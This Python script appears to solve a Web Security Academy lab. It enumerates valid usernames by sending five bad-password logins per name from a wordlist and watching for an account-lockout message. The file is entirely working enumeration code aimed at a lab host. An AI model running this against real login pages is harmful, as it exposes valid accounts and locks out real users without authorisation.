#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from requests.sessions import Session
from requests.models import Response
import re

def postLogin(client : Session, URL, page, username, password):
    loginData = dict(username = username, password =  password)
    return client.post(URL+page, loginData)

def parseResponse(response : Response):
    soup = BeautifulSoup(response.content, features = 'html.parser')

    if \
    soup.findAll('p', string = re.compile('Invalid username or password')) \
    != []:
        print('Invalid username or password')

    if \
    soup.body.findAll('p', string = re.compile('You have made too many incorrect login attempts')) \
    != []:
        print('You have made too many incorrect login attempts')
        print('Found potentially valid username')

def main():
    URL = 'https://acd61f821f7968028048233d001700c1.web-security-academy.net/'
    client = requests.Session()

    for username in open('/cygdrive/c/Users/nofil.qasim/Desktop/usernames.txt', 'r'):
        username = username.strip()
        for i in range(5):
            response = postLogin(
                client, URL,
                page = 'login',
                username = username,
                password = 'asdasd'
            )
            print(f'{username=}     status={response.status_code}')
            parseResponse(response)

if __name__ == '__main__':
    main()
